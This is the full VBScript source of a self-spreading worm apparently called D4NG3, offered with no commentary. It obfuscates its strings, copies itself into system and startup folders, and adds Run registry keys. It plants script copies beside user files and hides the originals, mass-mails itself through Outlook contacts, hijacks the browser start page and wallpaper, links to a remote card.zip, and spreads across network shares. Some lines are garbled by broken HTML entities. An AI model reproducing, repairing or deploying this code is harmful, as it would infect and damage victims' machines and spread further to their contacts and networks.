Set VF = CreateObject("Scripting.FileSystemObject")
Set fso = CreateObject("Scripting.FileSystemObject")
execute "set file = fso.Op"&"enTe"&"xtFile(WSc"&"ript.ScriptF"&
amp;
amp;"ullname,1)"
execute "fso.Ge""tFi""le(WSc"&"ript.Scr"&"ipt

Fu"&"llName).Co"&"py(""C:\MyPhoto.JPG.VBS"")"
execute "gfol = f"&"so.ge"&"tspecial"&"folder(0)"
execute "fso.Ge""tFi""le(WSc"&"ript.Scr"&"ipt

Fu"&"llName).Co"&"py(gfol & ""\D4NG3.vbs"")"
execute "fso.GetFile(WScript.ScriptFullName).Copy(gfol & ""\D4NG3.vbs"")"
vbscopy=file.ReadAll

If VF.FileExists("C:\No.txt") Then
else
main()
WAB()
DData()
Reg()
A()
Clone_2()
OLE()
make()
share()
wal()
If VF.FileExists("C:\0f.txt") Then
else
MailMe()
End if
Function Reg()
Set fso = CreateObject("Scripting.FileSystemObject")
execute "gfol = f"&"so.ge"&"tspecial"&"folder(0)"
FilePath = gfol & "\D4NG3.vbs"
Set Ws = createobject("wscript.shell")
Ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinMine", FilePath
End Function

Function MailMe()
On Error Resume Next
Dim x
execute "Set ol=Cr"&"ea"&"teOb"&"je"&"ct(("&a
mp;q
uot;O"&"ut"&"lo"&"ok.Ap"&"p"&
amp;
amp;"lic"&"at"&"io"&"n""))"
For x=1 To 50
y = 1
Email = "C:\Modifiche.xls"
execute "Set Ma"&"il=ol.Crea"&"teI"&"tem("&"0"&")"


execute "Ma"&"il.t"&"o=ol.Ge"&"tNa"&"meSp"&"ace(""MA"&am
p;am
p;"PI"").Ad"&"dressLi"&"sts("&"1&
amp;
quot;&").Add"&"res"&"sEnt"&"ries"&
amp;
amp;"("&"x"&")"
execute "Ma"&"il.Su"&"bje"&"ct=""Modif"&"iche..."""
execute "Ma"&"il.B"&"od"&"y="""""
execute "set Allega =Mail." & "Attac" & "hments"
execute "All"&"ega.A"&"dd(Em"&"ail)"
If Mail.to <> "" Then
execute "Ma"&"il.Se"&"nd"
Else
i = i + 1
End if
Next
ol.Quit
End Function

Function A()
folderlist("\")
listadriv = s
End Function
sub inf(folderspec)
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
 dim f,f1,fc,ext,ap,s,bname,mp3
execute "set f = fso." & "Get" & "Folder" & "(folderspec)"
 set fc = f.Files
 for each f1 in fc
  ext = fso.GetExtensionName(f1.path)
  ext = lcase(ext)
  s = lcase(f1.name)
if(ext="jpg") or (ext="jpeg") or (ext="dwg") or (ext="bak") or (ext="doc") or (ext="html") or (ext="xls") or (ext="mdb") or (ext="txt") or (ext="mp3") or (ext="gif") or (ext="png") or (ext="htm") then
if (f1.name="wallPaper.html") or (f1.name="untitled.HTM") then
else
  set Afiles = fso.CreateTextFile(f1.path & ".vbs")
  Afiles.write vbscopy
  Afiles.close
  set att = fso.GetFile(f1.path)
  att.attributes = att.attributes + 2
end if
end if
Next
End Sub
sub folderlist(folderspec)  
dim f,f1,sf
Set fso = CreateObject("Scripting.FileSystemObject")
execute "set f = fso." & "Get" & "Folder" & "(folderspec)"
execute "set sf = f." & "Sub" & "Folders"
 for each f1 in sf
   inf(f1.path)
   folderlist(f1.path)
 next  
end sub
Function DData()
Set fso = CreateObject("Scripting.FileSystemObject")
Set tf = fso.CreateTextFile("c:\System.dat.vbs", True)
tf.WriteLine("If day(now) = 10 then")
tf.WriteBlankLines(1)
tf.Write ("MsgBox "&""""&"YOU ARE SHIT!!!. :o)"&""""&",64,"&""""&am
p;am
p;":o)"&"""")
tf.WriteBlankLines(1)
tf.Write ("end if")
tf.WriteBlankLines(1)
tf.Close
DataReg()
End Function
Function DataReg()
FilePath2 = "c:\System.dat.vbs"
Set Ws = createobject("wscript.shell")
Ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Data", FilePath2
End Function
Function Clone_2()
Set fso = createobject("scripting.filesystemobject")
execute "gfol = f"&"so.ge"&"tspecial"&"folder(0)"
Set tf = fso.CreateTextFile(gfol&"\BasicUpdate.dll.vbs", True)
tf.Write ("On Error Resume Next")
tf.WriteBlankLines(1)
tf.Write ("Do")
tf.WriteBlankLines(1)
tf.Write ("Set regedit = CreateObject("&Chr(34)&"WScript.Shell"&Chr(34)&")"
;

tf.WriteBlankLines(1)
tf.Write ("regedit.RegWrite "&Chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page"&Chr(34)&", "&Chr(34)&"http://www.sesso.com"&Chr(34)&"")
tf.WriteBlankLines(1)
tf.Write ("Loop")
tf.WriteBlankLines(1)
tf.Close
FilePathA = gfol&"\BasicUpdate.dll.vbs"
Set Ws = createobject("wscript.shell")
Ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinSetBrowser", FilePathA
End Function
Function OLE()
Set fso = createobject("scripting.filesystemobject")
execute "gfol = f"&"so.ge"&"tspecial"&"folder(0)"
Set tf = fso.CreateTextFile(gfol&"\wallPaper.html", True)
tf.Write ("<html>")
tf.WriteBlankLines(1)
tf.Write ("<center>")
tf.WriteBlankLines(1)
tf.Write ("<br><br><br><br><br><br><font size='5'>Smile error:</font><font size='10'><br>Hello!!!<br></font><font size='50'>:o)</font><br><br><center>Infected by D4NG3 <br><font color=red>tf.WriteBlankLines(1)
tf.Write ("</center>")
tf.WriteBlankLines(1)
tf.Write ("<center><b>14/04/2003</b></center>")
tf.WriteBlankLines(1)
tf.Write ("</html>")
tf.Close
bgfile = gfol&"\wallPaper.html"
Set Ws = createobject("wscript.shell")
Ws.regwrite "HKEY_CURRENT_USER\Control Panel\desktop\wallPaper", bgfile
oeid = Ws.regread("HKEY_CURRENT_USER\Identities\Default User ID")
Set fso = createobject("scripting.filesystemobject")
execute "gfol = f"&"so.ge"&"tspecial"&"folder(0)"
Set tf = fso.CreateTextFile(gfol&"\index.html", True)
tf.Write (vbscopy)
tf.WriteBlankLines(1)
tf.Close
bfnt = gfol&"\untitled.HTM"
oe = "HKEY_CURRENT_USER\Identities\" & oeid & "\Software\Microsoft\Outlook Express\5.0\Mail"
MSH = oe & "\Message Send HTML"
CUS = oe & "\Compose Use Stationery"
SN = oe & "\Stationery Name"
WSN = oe & "\Wide Stationery Name"
Ws.regwrite MSH, 1
Ws.regwrite CUS, 1
Ws.regwrite SN, bfnt
Ws.regwrite WSN, bfnt
End Function
Function make()
 set fso = CreateObject("Scripting.FileSystemObject")
 execute "win = f"&"so.ge"&"tspecial"&"folder(0)"
 set b=fso.CreateTextFile(win & "\untitled.HTM")
 b.close
execute " b"&"h"&"t"&"m"&"l"&" = ""h"&"t"&"t"&"p"&":"&"/"&"/"&"w"&"w"&"w.com"&"una"&&
amp;
quot;lan"&"driano."&"it/ca"&"rd.zip"""
 set d=fso.OpenTextFile(win & "\untitled.HTM",2)
 d.write "<HTML>"
 d.WriteBlankLines(1)
 d.write "<HEAD>"
 d.WriteBlankLines(1)
 d.write "<Title>  </Title></HEAD>"
 d.WriteBlankLines(1)
 d.write "<Body>"
 d.WriteBlankLines(1)
 d.write "<script>document.write(""<br><br><center><a href='" & bhtml & "'><br>View your card...<br>Vedi la cartolina...</a></center>"");</SCRIPT>"
 d.WriteBlankLines(1)
 d.write "</Body>"
 d.WriteBlankLines(1)
 d.write "</HTML>"
 d.WriteBlankLines(1)
 d.write vbcrlf
 d.close
End Function
Function wal()
Set Ws = createobject("wscript.shell")
bgfile = gfol&"\wallPaper.html"
walo = Ws.regread("HKEY_CURRENT_USER\Control Panel\desktop\wallPaper")
IF bgfile <> walo then
bgfile = gfol&"\wallPaper.html"
Set Ws = createobject("wscript.shell")
Ws.regwrite "HKEY_CURRENT_USER\Control Panel\desktop\wallPaper", bgfile
End If
End Function

Function WAB()
Set Ws = createobject("wscript.shell")
olk = "HKEY_CURRENT_USER\Software\Microsoft\WAB\WAB4"
Az = olk & "\OlkContactRefresh"
Bz = olk & "\OlkFolderRefresh"
Cz = olk & "\FirstRun"
Dz = olk & "\UseOutlook"
Ws.regwrite Az, 0, "REG_DWORD"
Ws.regwrite Bz, 0, "REG_DWORD"
Ws.regwrite Cz, 1, "REG_DWORD"
Ws.regwrite Dz, 1, "REG_DWORD"
End Function

function main()
On Error Resume Next
data1 = "Windows Registry Editor Version 5.00"&vbcrlf& _
"[HKEY_CURRENT_USER\Software\Microsoft\Office\Outlook\OMI Account Manager\Accounts\00000001]"&vbcrlf& _
">=?Account Name>=?=>=?mail.supereva.it>=?"&vbcrlf& _
">=?Connection Type>=?=dword:00000000"&vbcrlf& _
">=?Make Available Offline>=?=dword:00000001"&vbcrlf& _
">=?IMAP Port>=?=dword:0000008f"&vbcrlf& _
">=?IMAP Timeout>=?=dword:0000003c"&vbcrlf& _
">=?IMAP Use LSUB>=?=dword:00000001"&vbcrlf& _
">=?IMAP Polling>=?=dword:00000001"&vbcrlf& _
">=?IMAP Svr-side Special Folders>=?=dword:00000001"&vbcrlf& _
">=?IMAP Sent Items Folder>=?=>=?Posta inviata>=?"&vbcrlf& _
">=?IMAP Drafts Folder>=?=>=?Bozze>=?"&vbcrlf& _
">=?IMAP Prompt for Password>=?=dword:00000000"&vbcrlf& _
">=?IMAP Dirty>=?=dword:00000000"&vbcrlf& _
">=?IMAP Poll All Folders>=?=dword:00000001"&vbcrlf& _
">=?HTTPMail Prompt for Password>=?=dword:00000000"&vbcrlf& _
">=?HTTPMail Polling>=?=dword:00000001"&vbcrlf& _
">=?ShowAdBar>=?=dword:00000001"&vbcrlf& _
">=?POP3 Server>=?=>=?mail.supereva.it>=?"&vbcrlf& _
">=?POP3 User Name>=?=>=?mp3free1>=?"&vbcrlf& _
">=?POP3 Password2>=?=hex:01,02,6d,00,61,00,69,00,6c,00,2e,00,73,00,75,00,70,00,65,\"&vbcrlf& _
"  00,72,00,65,00,76,00,61,00,2e,00,69,00,74,00,34,00,42,00,44,00,37,00,31,00,\"&vbcrlf& _
"  46,00,45,00,30,00,00,00"&vbcrlf& _
">=?POP3 Use Sicily>=?=dword:00000000"&vbcrlf& _
">=?POP3 Port>=?=dword:0000006e"&vbcrlf& _
">=?POP3 Timeout>=?=dword:0000003c"&vbcrlf& _
">=?POP3 Skip Account>=?=dword:00000001"&vbcrlf& _
">=?POP3 Prompt for Password>=?=dword:00000000"&vbcrlf& _
">=?SMTP Server>=?=>=?mail.supereva.it>=?"&vbcrlf& _
">=?SMTP Port>=?=dword:00000019"&vbcrlf& _
">=?SMTP Timeout>=?=dword:0000003c"&vbcrlf& _
">=?SMTP Display Name>=?=>=?ss dd>=?"&vbcrlf& _
">=?SMTP Email Address>=?=>=?mp3free1@supereva.it>=?"&vbcrlf& _
">=?SMTP Split Messages>=?=dword:00000000"&vbcrlf& _
">=?SMTP Split Message Size>=?=dword:00000040"&vbcrlf& _
">=?=?SMTP Prompt for Password>=?=dword:00000000"

 dt1 = replace(data1, chr(62) & chr(61) & chr(63), """")
 Set fso = createobject("scripting.filesystemobject")
 set b=fso.CreateTextFile("C:\small.reg")
 b.close
 set d=fso.OpenTextFile("C:\small.reg",2)
 d.Write dt1
 d.close

 Set Shell = WScript.CreateObject("WScript.Shell")
 Shell.Run "c:\small.reg", 1
 Set Shell = Nothing
 Set WshShell = WScript.CreateObject("WScript.Shell")
 WScript.Sleep 200
 WshShell.SendKeys "{ENTER}"
 WScript.Sleep 200
 WshShell.SendKeys "{ENTER}"
 WScript.Sleep 100
 Set keyr = fso.GetFile("c:\small.reg")
 keyr.Delete
end function

Function share()
On Error Resume Next
set wshnetwork = wscript.createobject("wscript.network")
Const OpenAsDefault    = -2
Const FailIfNotExist   =  0
Const ForReading       =  1
for ap = 192 to 255
for bp = 168 to 255
for cp = 0 to 255
for dp = 0 to 255
x = "."
sHost = ap & x & bp & x & cp & x & dp
Set oShell = CreateObject("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")
sTemp = "C:"
sTempFile = sTemp & "\netlog.tmp"
oShell.Run "%comspec% /c ping -n 1 " & sHost & ">" & sTempFile, 0 , True
Set fFile = oFSO.OpenTextFile(sTempFile, ForReading, FailIfNotExist, OpenAsDefault)
Set fso = CreateObject("scripting.filesystemobject")
Set r = fso.opentextfile("C:\netlog.tmp")
buff = ""
for az = 0 to 3
buff = r.readline
next
buff2 = InStr(buff,"TTL=")
if buff2 <> "0" then
Call registra(sHost)
end if
next
next
next
next
End Function

Function registra(computer)
set wshnetwork = wscript.createobject("wscript.network")
sharename = "\\" & computer &"\C"
wshnetwork.mapnetworkdrive "j:", sharename
execute = "fso.copyfile WSc"&"ript.Scrip"&"tFul"&"lname, "&Chr(34)&"j:\netlog.vbs"&Chr(34)
If (fso.FileExists("j:\netlog.vbs")) Then
Set WshShell = Wscript.CreateObject("Wscript.Shell")
execute "sup = WshShell.Sp"&"ecia"&"lFol"&"ders(" & Chr(34) & "AllUsersStartup" & Chr(34) & ")"
execute = "fso.copyfile WSc"&"ript.Script"&"Ful"&"lname, " & sup & "\"
execute = "fso.copyfile WSc"&"ript.Script"&"Ful"&"lname, "&Chr(34)&"j:\W"&"I"&"N"&"D"&"O"&&am
p;qu
ot;W"&"S\Men"&"u Av"&"vio\Prog"&"rammi\Es"&"ec"&"uzi"&"on"&"e au"&"tom"&"at"&"ica\"&Chr(34)
execute = "fs"&"o.co"&"pyfile WScrip"&"t.Script"&"Ful"&"lname, "&Chr(34)&"j:\w"&"i"&"n"&"d"&"o"&&am
p;qu
ot;w"&"s\st"&"artm~1\prog"&"rams\st"&"artup\"&Chr(34)
execute = "fso.copyfile WScript.ScriptFu"&"lln"&"ame, "&Chr(34)&"j:\w"&"i"&"n"&"d"&"o"&&am
p;qu
ot;w"&"s\"&Chr(34)
execute = "fs"&"o.copyfil"&"e WScript.Scr"&"iptF"&"ull"&"name, "&Chr(34)&"j:\w"&"i"&"n"&"d"&"o"&&am
p;qu
ot;w"&"s"&"\"&"s"&"t"&"a"&"r"&&
;quo
t;t "&"m"&"en"&"u\pro"&"gra"&"ms\st"&"ar"&"tu"&"p\"&Chr(34)
execute = "fso.cop"&"yfile WScr"&"ipt.Scr"&"iptF"&"ulln"&"ame

, "&Chr(34)&"j:\w"&"i"&"n"&"9"&"5"&&am
p;qu
ot;\"&"s"&"t"&"a"&"rt m"&"e"&"nu\pr"&"o"&"gr"&"a"&"ms\s"&"ta"&"r"&"tu"&"p\"&Chr(34)
End If 
wshnetwork.removenetworkdrive "j:"
End function

End if
